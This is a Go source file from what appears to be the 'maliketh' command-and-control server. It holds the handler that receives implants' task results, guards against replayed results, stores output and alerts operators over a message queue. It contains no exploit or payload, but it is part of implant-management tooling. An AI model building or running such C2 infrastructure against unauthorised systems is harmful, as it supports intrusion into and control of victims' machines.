package c2

import (
	"encoding/base64"
	"errors"
	"net/http"

	"github.com/cbrnrd/maliketh/server-go/internal/model"
	"github.com/jackc/pgx/v5"
	"go.uber.org/zap"
)

type taskResultRequest struct {
	Status bool   `json:"status"`
	Tid    string `json:"tid"`
	Output string `json:"output"`
}

func (h *Handler) handleTaskResults() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		implant := GetImplant(r.Context())
		if implant == nil {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		body := GetDecryptedBody(r.Context())
		if body == nil {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		// Validate request body
		req, ok := h.validateTaskResultBody(body)
		if !ok {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		// Update last seen and IP
		if err := h.repos.Implant.UpdateCheckin(r.Context(), implant.ImplantID, r.RemoteAddr); err != nil {
			h.logger.Error("failed to update checkin",
				zap.String("implant_id", implant.ImplantID),
				zap.Error(err))
		}

		// Get task
		task, err := h.repos.Task.GetByID(r.Context(), req.Tid)
		if err != nil {
			if errors.Is(err, pgx.ErrNoRows) {
				h.logger.Warn("task not found", zap.String("task_id", req.Tid))
				http.Error(w, "Not Found", http.StatusNotFound)
				return
			}
			h.logger.Error("failed to get task",
				zap.String("task_id", req.Tid),
				zap.Error(err))
			http.Error(w, "Internal error", http.StatusInternalServerError)
			return
		}

		// Verify task is in TASKED state (prevent replay attacks)
		if task.Status != model.TaskStatusTasked {
			h.logger.Warn("task is not in tasked state, possible replay attack",
				zap.String("task_id", req.Tid),
				zap.String("status", string(task.Status)))
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		// Determine final status
		var status model.TaskStatus
		if req.Status {
			status = model.TaskStatusComplete
		} else {
			status = model.TaskStatusError
		}

		// Update task result
		if err := h.repos.Task.SetResult(r.Context(), req.Tid, status, req.Output); err != nil {
			h.logger.Error("failed to update task result",
				zap.String("task_id", req.Tid),
				zap.Error(err))
			http.Error(w, "Internal error", http.StatusInternalServerError)
			return
		}

		h.logger.Info("task completed",
			zap.String("task_id", req.Tid),
			zap.String("status", string(status)))

		// Notify operator
		if h.publisher != nil {
			operator, err := h.repos.Operator.GetByUsername(r.Context(), task.OperatorName)
			if err != nil {
				h.logger.Error("failed to get operator for notification",
					zap.String("operator", task.OperatorName),
					zap.Error(err))
			} else {
				msg := "[" + task.ImplantID + "] Task " + task.TaskID + " completed - " + string(status)
				h.publisher.PublishToOperator(r.Context(), operator.RMQQueue, msg)

				// If error, also send the decoded output
				if status == model.TaskStatusError {
					if decoded, err := base64.StdEncoding.DecodeString(req.Output); err == nil {
						errMsg := "[" + task.ImplantID + "] Task " + task.TaskID + " error output - " + string(decoded)
						h.publisher.PublishToOperator(r.Context(), operator.RMQQueue, errMsg)
					}
				}
			}
		}

		w.Write([]byte("OK"))
	}
}

func (h *Handler) validateTaskResultBody(body map[string]any) (*taskResultRequest, bool) {
	status, ok := body["status"].(bool)
	if !ok {
		return nil, false
	}

	tid, ok := body["tid"].(string)
	if !ok || tid == "" {
		return nil, false
	}

	output, ok := body["output"].(string)
	if !ok {
		return nil, false
	}

	return &taskResultRequest{
		Status: status,
		Tid:    tid,
		Output: output,
	}, true
}
